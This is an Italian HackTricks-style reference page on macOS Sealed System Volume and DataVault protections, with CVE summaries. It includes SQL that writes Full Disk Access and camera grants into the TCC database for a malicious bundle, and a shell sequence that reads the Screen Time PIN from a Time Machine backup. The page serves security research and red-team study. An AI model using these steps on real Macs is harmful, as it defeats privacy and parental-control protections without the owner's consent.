# Volume di sistema sigillato e DataVault di macOS

{{#include ../../../banners/hacktricks-training.md}}

## Volume di sistema sigillato (SSV)

### Informazioni di base

A partire da **macOS Big Sur (11.0)**, il volume di sistema è sigillato crittograficamente tramite un **albero hash di snapshot APFS**. Questa funzionalità è chiamata **Sealed System Volume (SSV)**. La partizione di sistema viene montata in **sola lettura** e qualsiasi modifica rompe il sigillo, che viene verificato durante l’avvio.<sup>[[11]](#references)</sup>

SSV offre:
- **Rilevamento delle manomissioni** — qualsiasi modifica ai binari o ai framework di sistema cambia la radice dell’albero di Merkle e invalida il sigillo firmato da Apple
- **Autenticazione all’avvio** — la catena di avvio verifica lo snapshot di sistema selezionato prima che diventi il filesystem root
- **Resistenza ai rootkit** — nemmeno root può sostituire in modo permanente i file nello snapshot di sistema autenticato senza disabilitare authenticated root o compromettere un percorso di aggiornamento autorizzato

SSV protegge il volume **System**, non il volume scrivibile **Data** a esso abbinato. I firmlink uniscono entrambi i volumi nello spazio dei nomi visibile in `/`, quindi un percorso che sembra scrivibile non dimostra che l’oggetto sottostante appartenga allo snapshot sigillato. FileVault e Data Protection proteggono la riservatezza dei dati inattivi; sono separati dall’integrità di SSV.<sup>[[11]](#references)</sup>

### Verifica dello stato di SSV

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Vista effettiva del sistema: SSV + graft dei Cryptex

Nelle versioni recenti di macOS, non tutti gli eseguibili visibili sotto `/System` provengono necessariamente dallo snapshot SSV avviato. I **Cryptex** sono immagini disco APFS autenticate separatamente, il cui contenuto viene montato sopra directory selezionate; le Rapid Security Responses possono quindi sostituire componenti sensibili per la sicurezza senza ricostruire l’SSV di base. Quando analizzi la persistenza o confronti il codice di sistema, inventaria i mount attivi e lo store dei Cryptex in Preboot invece di calcolare l’hash soltanto dello snapshot di base:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

Il boot chain e i dettagli di Rapid Security Response sono trattati in [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); questa sezione si concentra sul confine dell’SSV.

### Entitlements degli scrittori SSV

Alcuni binari di sistema Apple dispongono di entitlements che consentono loro di modificare o gestire il volume di sistema sigillato:

| Entitlement | Scopo |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Ripristinare il volume di sistema a uno snapshot precedente |
| `com.apple.private.apfs.create-sealed-snapshot` | Creare un nuovo snapshot sigillato dopo gli aggiornamenti di sistema |
| `com.apple.rootless.install.heritable` | Scrivere in percorsi protetti da SIP (ereditato dai processi figli) |
| `com.apple.rootless.install` | Scrivere in percorsi protetti da SIP |

### Individuare gli scrittori SSV

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Attack Scenarios

#### Snapshot Rollback Attack

Se un attacker compromette un binario con `com.apple.private.apfs.revert-to-snapshot`, può **riportare il volume di sistema a uno stato precedente all’aggiornamento**, ripristinando vulnerabilità note:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Il rollback di uno snapshot **annulla di fatto gli aggiornamenti di sicurezza**, ripristinando vulnerabilità del kernel e del sistema già corrette. È una delle operazioni più pericolose possibili sulle versioni moderne di macOS.

#### Sostituzione dei binari di sistema

Con un bypass di SIP + la possibilità di scrivere su SSV, un attaccante può:

1. Montare il volume di sistema in lettura-scrittura
2. Sostituire un daemon di sistema o una libreria di framework con una versione trojanizzata
3. Sigillare nuovamente lo snapshot (oppure accettare che il sigillo sia compromesso, se SIP è già degradato)
4. Il rootkit persiste dopo il riavvio ed è invisibile agli strumenti di rilevamento in userland

### CVE reali

| CVE | Descrizione |
|---|---|
| CVE-2021-30892 | **Shrootless** — bypass di SIP che sfrutta l’entitlement `com.apple.rootless.install.heritable` di `system_installd` per eseguire script post-installazione arbitrari ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Bypass di SIP: `system_installd` memorizzava lo script post-installazione in una cartella protetta da SIP sotto `/tmp`, ma `/tmp` non è protetta da SIP, quindi la cartella poteva essere sostituita montandovi sopra un’immagine ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — race condition copy-on-write in XNU che consente di scrivere su file di sola lettura di proprietà di root ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Informazioni di base

**DataVault** è una protezione del filesystem basata su entitlement per file e directory sensibili. Il flag BSD `UF_DATAVAULT` (`0x00000080`) contrassegna un oggetto come bisognoso di un entitlement sia per la lettura sia per la scrittura; a differenza del normale DAC, diventare semplicemente **root** o ottenere Full Disk Access non è sufficiente a superare questo controllo quando la protezione è attiva.<sup>[[4]](#references)[[13]](#references)</sup>

Non usare “DataVault” come sinonimo di ogni database protetto. I database TCC sono regolati da TCC/FDA e da policy specifiche di SIP (vedi [macOS TCC](macos-tcc/README.md)), mentre l’accesso agli elementi del portachiavi dipende anche dalle ACL del portachiavi e dalla protezione crittografica (vedi [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Esempi concreti di DataVault si trovano spesso in archivi di proprietà dei servizi sotto `/private/var/folders/.../0/`, come l’archivio di Screen Time; il flag è visibile come `datavault` nei flag BSD del file quando è possibile eseguire `stat` sulla directory padre.

### Entitlement dei controller DataVault

| Entitlement | Ambito |
|---|---|
| `com.apple.rootless.datavault.controller` | Accedere agli oggetti `UF_DATAVAULT` e gestirli<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Gestire le decisioni TCC; è un confine di privacy correlato ma separato |
| `com.apple.private.tcc.allow` | Bypassare i servizi TCC selezionati e specificati nel valore dell’entitlement |
| `com.apple.rootless.storage.TCC` | Scrivere nell’archivio TCC protetto da SIP |

Un processo che combina un entitlement di controller DataVault con funzionalità FDA, di backup, indicizzazione o IPC è particolarmente interessante: cerca una primitiva di confused deputy che copi un oggetto protetto in un percorso ordinario, invece di tentare di aprire direttamente il vault.<sup>[[14]](#references)</sup>

### Individuazione dei controller DataVault

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Scenari di attacco

#### Modifica diretta del database TCC (confine TCC separato)

Se un attacker compromette un processo TCC manager (ad es., tramite code injection in un processo che dispone di `com.apple.private.tcc.manager`), può **modificare direttamente il database TCC** per concedere a qualsiasi applicazione qualsiasi permesso TCC:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> La modifica del database TCC è il **bypass definitivo della privacy**: concede qualsiasi autorizzazione senza alcuna richiesta all’utente o indicatore visibile. Storicamente, diverse catene di privilege escalation su macOS si sono concluse con la scrittura nel database TCC come payload finale.

#### Accesso al database del Keychain

L’accesso diretto al database che funge da archivio per un keychain non equivale all’accesso ai segreti in testo in chiaro. Se un altro confine di privilegi consente a un attacker di copiare il database, è comunque necessario attaccare le chiavi crittografiche e le ACL degli elementi; consulta invece la pagina dedicata a [macOS Keychain](../../macos-red-teaming/macos-keychain.md), senza presumere che un entitlement da DataVault-controller sia sufficiente.

#### Confine della copia di backup: Time Machine

Un’analisi del 2026 ha dimostrato un utile schema generale: `backupd` dispone sia di `com.apple.rootless.datavault.controller` sia di Full Disk Access, così da poter copiare archivi protetti. Nella configurazione testata, `/private/var/folders` era incluso in Time Machine e la copia del backup montata non applicava il confine DataVault attivo. Il ricercatore ha usato questo metodo per individuare l’archivio SQLite di Screen Time e leggere il PIN delle restrizioni in chiaro, senza aprire il vault attivo. Consideralo un **attacco al confine della copia**: individua i deputy di backup, esportazione, migrazione, indicizzazione e diagnostica che possono materializzare i dati del vault su un mount o in un percorso meno protetto.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Questo comportamento dipende dalla versione e dalla struttura del backup. Verificalo sulla build di destinazione e ricorda che una destinazione Time Machine cifrata protegge la copia solo mentre è bloccata; una volta montata, i suoi controlli di accesso entrano a far parte della superficie di attacco.

### CVE reali che coinvolgono DataVault/TCC Bypass

| CVE | Descrizione |
|---|---|
| CVE-2024-44131 | Una race condition con symlink in FileProvider consente a un helper con privilegi elevati di accedere a dati protetti da TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Come root, **creare un nuovo utente il cui `NFSHomeDirectory` punta a un `TCC.db` controllato dall'attaccante**; al login, `tccd` lo utilizza e applica le autorizzazioni, consentendo di accedere ai dati di altri utenti ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": modificare la home directory dell'utente per installare un `TCC.db` controllato dall'attaccante ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Un difetto nella verifica del bundle consente a un'app di **ereditare le autorizzazioni TCC di un bundle donatore** senza mostrare una richiesta; sfruttato in natura da **XCSSET** per acquisire screenshot del desktop ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` ricavava il percorso del DB da `$HOME`, quindi `launchctl setenv HOME` lo reindirizzava a un `TCC.db` controllato dall'attaccante ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` disponeva di `com.apple.private.tcc.manager` **e** aveva disabilitato la convalida delle librerie, quindi un plug-in HAL inserito in `/Library/Audio/Plug-Ins/HAL` poteva concedere autorizzazioni TCC arbitrarie ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft individua una nuova vulnerabilità di macOS, Shrootless, che potrebbe aggirare System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Analisi tecnica: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Vale la pena farlo male](https://worthdoingbadly.com/macdirtycow/)
- [4] [Sicurezza delle piattaforme Apple — Protezione dei dati](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: il bypass di TCC sottrae dati da iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Alla scoperta del malware per macOS: bypass di TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Una nuova vulnerabilità di macOS, "powerdir", potrebbe consentire l'accesso non autorizzato ai dati degli utenti](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Scoperto un bypass zero-day di TCC nel malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: bypass del framework Transparency, Consent, and Control (TCC) di macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Riprodurre musica e aggirare TCC, ovvero CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [L'incubo degli aggiornamenti OTA di Apple (snapshot APFS)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — Sfruttamento di TCC](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Come aggirare il proprio codice di Tempo di utilizzo — analisi del codice sorgente e di Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
